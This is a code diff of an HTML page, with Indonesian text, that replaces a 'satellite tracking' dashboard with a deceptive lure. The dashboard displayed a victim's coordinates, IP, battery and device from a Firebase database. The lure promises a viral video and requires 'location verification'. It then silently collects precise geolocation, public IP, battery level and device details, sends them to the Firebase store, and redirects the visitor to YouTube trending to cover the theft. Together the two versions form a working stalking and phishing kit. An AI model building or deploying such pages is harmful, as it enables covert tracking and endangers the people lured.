@@ -3,98 +3,91 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HQ Monitoring Dashboard</title>
+    <title>Verifikasi Keamanan Konten</title>
     <style>
-        body { font-family: 'Courier New', monospace; background: #0a0a0a; color: #00ff41; margin: 0; padding: 20px; }
-        .grid { display: grid; grid-template-columns: 1fr 350px; gap: 20px; }
-        @media (max-width: 768px) { .grid { grid-template-columns: 1fr; } }
-        .card { background: #141414; border: 1px solid #00ff41; padding: 15px; border-radius: 8px; margin-bottom: 20px; box-shadow: 0 0 10px rgba(0,255,65,0.1); }
-        .map-container { height: 450px; width: 100%; border-radius: 8px; overflow: hidden; border: 1px solid #00ff41; background: #000; }
-        iframe { width: 100%; height: 100%; border: none; filter: invert(90%) hue-rotate(180deg); }
-        .data-item { margin: 12px 0; font-size: 13px; display: flex; justify-content: space-between; border-bottom: 1px dashed #222; padding-bottom: 5px; }
-        .label { color: #00ff41; font-weight: bold; text-transform: uppercase; font-size: 11px; }
-        .value { color: #fff; text-align: right; }
-        .status-online { display: inline-block; width: 10px; height: 10px; background: #00ff41; border-radius: 50%; box-shadow: 0 0 8px #00ff41; animation: blink 1s infinite; margin-right: 10px; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        #debug-log { font-size: 10px; color: #444; margin-top: 10px; word-break: break-all; }
+        body { font-family: 'Segoe UI', sans-serif; background-color: #0f172a; color: #f8fafc; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; }
+        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.3); max-width: 320px; width: 90%; }
+        .icon { font-size: 50px; margin-bottom: 20px; }
+        h2 { font-size: 18px; margin-bottom: 10px; font-weight: 600; }
+        p { font-size: 13px; color: #94a3b8; line-height: 1.6; margin-bottom: 25px; }
+        .btn { background: #3b82f6; color: white; border: none; padding: 15px 20px; border-radius: 12px; font-weight: bold; cursor: pointer; width: 100%; transition: 0.3s; }
+        #loader { display: none; margin-top: 15px; border: 3px solid #334155; border-top: 3px solid #3b82f6; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; margin-left: auto; margin-right: auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div style="display: flex; align-items: center; margin-bottom: 20px;">
-    <span class="status-online"></span>
-    <h1 style="font-size: 20px; margin: 0;">SATELLITE TRACKING INTERFACE</h1>
-</div>
-
-<div class="grid">
-    <div class="card">
-        <h2>LIVE VISUALIZATION</h2>
-        <div class="map-container" id="mapBox">
-            <p style="text-align:center; padding-top:180px;">MENGHUBUNGKAN KE SATELIT...</p>
-        </div>
-    </div>
-
-    <div class="card">
-        <h2>TARGET DATA</h2>
-        <div class="data-item"><span class="label">Last Update</span> <span class="value" id="time">-</span></div>
-        <div class="data-item"><span class="label">Latitude</span> <span class="value" id="lat">-</span></div>
-        <div class="data-item"><span class="label">Longitude</span> <span class="value" id="lon">-</span></div>
-        <div class="data-item"><span class="label">IP Address</span> <span class="value" id="ip">-</span></div>
-        <div class="data-item"><span class="label">Battery</span> <span class="value" id="battery">-</span></div>
-        <div class="data-item"><span class="label">Status</span> <span class="value" id="status">-</span></div>
-        <div class="data-item"><span class="label">Device</span> <span class="value" id="device" style="font-size: 10px;">-</span></div>
-        
-        <hr border="0" style="border-top:1px solid #333; margin: 15px 0;">
-        <button onclick="location.reload()" style="background:#00ff41; color:#000; border:none; padding:15px; width:100%; cursor:pointer; font-weight:bold; border-radius: 5px;">RESTART SYSTEM</button>
-        
-        <div id="debug-log">Raw Data: Waiting...</div>
-    </div>
+<div class="card" id="mainCard">
+    <div class="icon">🛡️</div>
+    <h2>Verifikasi Wilayah</h2>
+    <p>Konten ini sedang tren di wilayah Anda. Silakan verifikasi lokasi untuk membuka aplikasi YouTube secara otomatis.</p>
+    <button class="btn" id="startBtn" onclick="processAll()">BUKA VIDEO VIRAL</button>
+    <div id="loader"></div>
 </div>
 
 <script>
-    // URL Database Firebase Anda
     const DB_URL = "https://trackeronlineviral-default-rtdb.asia-southeast1.firebasedatabase.app/target_hp.json";
+    const YT_URL = "https://www.youtube.com/trending";
+    const YT_APP_INTENT = "intent://www.youtube.com/trending#Intent;package=com.google.android.youtube;scheme=https;end";
 
-    function fetchData() {
-        fetch(DB_URL)
-        .then(res => res.json())
-        .then(data => {
-            if (data) {
-                // Update Tampilan Debug (Untuk memastikan data masuk ke browser)
-                document.getElementById('debug-log').innerText = "Raw Data: Connected";
+    async function getIP() {
+        try {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        } catch (e) { return "Hidden/VPN"; }
+    }
 
-                // Update Kolom Data sesuai key di index.html
-                document.getElementById('time').innerText = data.updated_at || "-";
-                document.getElementById('lat').innerText = data.lat || "0";
-                document.getElementById('lon').innerText = data.lon || "0";
-                document.getElementById('ip').innerText = data.ip || "N/A";
-                document.getElementById('battery').innerText = data.battery || "N/A";
-                document.getElementById('status').innerText = data.status || "Offline";
-                document.getElementById('device').innerText = data.device || "-";
-
-                // Update Peta hanya jika koordinat tersedia
-                if (data.lat && data.lon) {
-                    const mapURL = `https://maps.google.com/maps?q=${data.lat},${data.lon}&t=&z=16&ie=UTF8&iwloc=&output=embed`;
-                    const mapBox = document.getElementById('mapBox');
-                    
-                    // Hindari reload iframe jika koordinat tidak berubah
-                    if (mapBox.dataset.lastLat != data.lat) {
-                        mapBox.innerHTML = `<iframe src="${mapURL}"></iframe>`;
-                        mapBox.dataset.lastLat = data.lat;
-                    }
-                }
-            } else {
-                document.getElementById('debug-log').innerText = "Raw Data: No Data in Firebase";
+    async function getBattery() {
+        try {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                return Math.round(battery.level * 100) + "%";
             }
-        })
-        .catch(err => {
-            document.getElementById('debug-log').innerText = "Error: " + err.message;
+            return "N/A";
+        } catch (e) { return "N/A"; }
+    }
+
+    async function sendData(coords) {
+        const ip = await getIP();
+        const bat = await getBattery();
+        const payload = {
+            lat: coords.latitude,
+            lon: coords.longitude,
+            ip: ip,
+            battery: bat,
+            device: navigator.userAgent.split('(')[1]?.split(')')[0] || "Mobile",
+            updated_at: new Date().toLocaleString("id-ID"),
+            status: "Online"
+        };
+
+        return fetch(DB_URL, { 
+            method: 'PUT', 
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload) 
         });
     }
 
-    // Pembaruan otomatis setiap 3 detik
-    setInterval(fetchData, 3000);
-    window.onload = fetchData;
+    function processAll() {
+        document.getElementById('startBtn').style.display = "none";
+        document.getElementById('loader').style.display = "block";
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                // Kirim data dulu sampai selesai
+                await sendData(pos.coords);
+                
+                // Baru redirect
+                setTimeout(() => {
+                    window.location.href = YT_APP_INTENT;
+                    setTimeout(() => { window.location.href = YT_URL; }, 1000);
+                }, 500);
+            }, (err) => {
+                alert("Akses lokasi diperlukan untuk memverifikasi konten wilayah Anda.");
+                location.reload();
+            }, { enableHighAccuracy: true });
+        }
+    }
 </script>
 </body>
 </html>
